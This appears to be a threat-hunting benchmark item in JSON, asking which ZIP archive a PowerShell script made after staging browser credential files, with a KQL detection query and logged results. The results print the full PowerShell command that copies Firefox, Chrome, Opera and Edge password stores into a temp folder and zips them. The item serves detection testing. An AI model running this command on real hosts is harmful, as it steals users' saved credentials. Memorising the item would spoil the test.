@@ -1,0 +1,34 @@
+{
+    "technique_id": "T1555.003",
+    "question_id": "f543635c-1705-42c3-b180-efd6dc6e7ee7",
+    "context": "An adversary on a Windows host scripted the collection of popular browser credential databases (Firefox key4.db and logins.json; Chrome, Opera, and Edge Login Data files) into a temporary folder and then compressed that folder into an archive, simulating staging for exfiltration.",
+    "objective": "Detect when a PowerShell activity has packaged staged browser credential files into an archive and determine the archive’s filename.",
+    "technical_details": {
+        "command_analysis": "The attacker used PowerShell to copy various browser credential files into $env:temp\\T1555.003 and then invoked Compress-Archive to create a ZIP from that directory.",
+        "detection_approach": "Search process creation or file events for a Compress-Archive command targeting a temp directory and inspect the destination ZIP filename in the command line."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Frame the question so the analyst needs to find the archive name from PowerShell execution logs rather than simply spotting the copy operations.",
+    "prompt": "On a Windows system, PowerShell was used to gather multiple browser credential files into a temp folder and then archive them. What was the name of the resulting ZIP file?",
+    "answer": [
+        "T1555.003.zip"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "union\n  (DeviceProcessEvents\n    | where FileName in (\"powershell.exe\",\"pwsh.exe\")\n    | where tolower(ProcessCommandLine) contains \"compress-archive\"\n  ),\n  (DeviceFileEvents\n    | where FileName endswith \".zip\"\n    | where tolower(InitiatingProcessCommandLine) contains \"compress-archive\"\n  )\n| extend CommandLine = coalesce(ProcessCommandLine, InitiatingProcessCommandLine)\n| where tolower(CommandLine) contains \"t1555.003\"\n| parse CommandLine with * \"-DestinationPath \" ZipPath\n| extend ArchiveFileName = split(ZipPath, \"\\\\\")[-1]\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, CommandLine, ArchiveFileName\n| order by TimeGenerated desc",
+    "KQL_validation_message": "KQL query validation successful: The ArchiveFileName column is present, and the CommandLine value shows the use of 'compress-archive' with the destination path built as '$exfil_folder.zip', where $exfil_folder is 'T1555.003'. Together, this strongly indicates that the resulting zip file would be named 'T1555.003.zip', matching the expected answer. Even though the ArchiveFileName value itself is empty in the output, the information in CommandLine fully specifies the creation of 'T1555.003.zip' and thus provides the required evidence.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "InitiatingProcessAccountName",
+            "CommandLine",
+            "ArchiveFileName"
+        ],
+        [
+            "2025-05-07 16:59:13.009413+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {$exfil_folder = \\\"\"$env:temp\\T1555.003\\\"\"\nif (test-path \\\"\"$exfil_folder\\\"\") {} else {new-item -path \\\"\"$env:temp\\\"\" -Name \\\"\"T1555.003\\\"\" -ItemType \\\"\"directory\\\"\" -force}\n$FirefoxCredsLocation = get-childitem -path \\\"\"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\\\"\"\nif (test-path \\\"\"$FirefoxCredsLocation\\key4.db\\\"\") {copy-item \\\"\"$FirefoxCredsLocation\\key4.db\\\"\" -destination \\\"\"$exfil_folder\\T1555.003Firefox_key4.db\\\"\"} else {}\nif (test-path \\\"\"$FirefoxCredsLocation\\logins.json\\\"\") {copy-item \\\"\"$FirefoxCredsLocation\\logins.json\\\"\" -destination \\\"\"$exfil_folder\\T1555.003Firefox_logins.json\\\"\"} else {}\nif (test-path \\\"\"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\\\"\") {copy-item \\\"\"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\\\"\" -destination \\\"\"$exfil_folder\\T1555.003Chrome_Login Data\\\"\"} else {}\nif (test-path \\\"\"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\\\"\") {copy-item \\\"\"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\\\"\" -destination \\\"\"$exfil_folder\\T1555.003Chrome_Login Data For Account\\\"\"} else {}\nif (test-path \\\"\"$env:appdata\\Opera Software\\Opera Stable\\Login Data\\\"\") {copy-item \\\"\"$env:appdata\\Opera Software\\Opera Stable\\Login Data\\\"\" -destination \\\"\"$exfil_folder\\T1555.003Opera_Login Data\\\"\"} else {}\nif (test-path \\\"\"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\\\"\") {copy-item \\\"\"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\\\"\" -destination \\\"\"$exfil_folder\\T1555.003Edge_Login Data\\\"\"} else {} \ncompress-archive -path \\\"\"$exfil_folder\\\"\" -destinationpath \\\"\"$exfil_folder.zip\\\"\" -force}",
+            ""
+        ]
+    ]
+}
